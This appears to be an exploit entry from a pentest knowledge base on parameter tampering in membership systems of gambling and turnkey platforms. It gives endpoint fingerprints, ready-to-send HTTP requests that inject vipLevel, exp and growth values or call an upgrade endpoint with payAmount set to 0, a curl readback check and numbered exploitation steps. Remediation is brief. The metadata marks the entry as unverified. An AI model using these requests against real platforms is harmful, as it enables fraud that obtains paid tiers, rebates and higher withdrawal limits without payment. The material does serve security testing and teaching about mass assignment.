---
title: VIP/level endpoint parameter tampering (higher-tier benefits for free)
cve: None (business logic)
severity: high
cvss: 8.1
product: Custom membership systems (gambling/turnkey platforms)
versions: Any
ports: 80, 443
keywords: vip, level, tier, benefits, parameter tampering, membership
entry: /api/user/level or vipLevel/levelId in profile updates
verified: false
sources: Compiled from public sources (business logic flaws; no CVE)
---

## Fingerprints

```
/api/user/info        → Returns vipLevel / levelId / exp / growth
/api/user/update      → Request body may accept parameters with the same names
/api/vip/upgrade      → Upgrade endpoint
```

## Prerequisites

- An ordinary member account; ability to capture profile-update or upgrade requests.

## PoC

```http
### 1) Insert level fields into a profile update
POST /api/user/update HTTP/1.1
Authorization: Bearer <token>
Content-Type: application/json

{"nickname":"x","vipLevel":9,"levelId":9,"exp":9999999,"growth":9999999}
```

```http
### 2) Specify the target level directly in the upgrade endpoint
POST /api/vip/upgrade HTTP/1.1

{"levelId":9,"payAmount":0,"couponId":null}
```

```bash
# 3) Read back to confirm
curl -s https://target/api/user/info -H "Authorization: Bearer <token>" | jq '.data.vipLevel,.data.levelId'
# Confirmation: readback changes to 9 = success; original level unchanged = blocked by backend allowlisting
```

## Exploitation Steps

1. First try 1 (profile update), then read back to confirm;
2. If unsuccessful, try 2 (upgrade endpoint), noting `payAmount:0`;
3. Higher levels often include "withdrawal limits/rebate rates/dedicated support"—changed benefits demonstrate impact;
4. Evidence: request + level fields read back.

## Remediation and Mitigation

- Calculate levels only server-side from cumulative transaction volume; allowlist update-endpoint fields.
- Validate payment orders and the level-mapping table in the upgrade endpoint.

## References

- OWASP Mass Assignment; CWE-915.
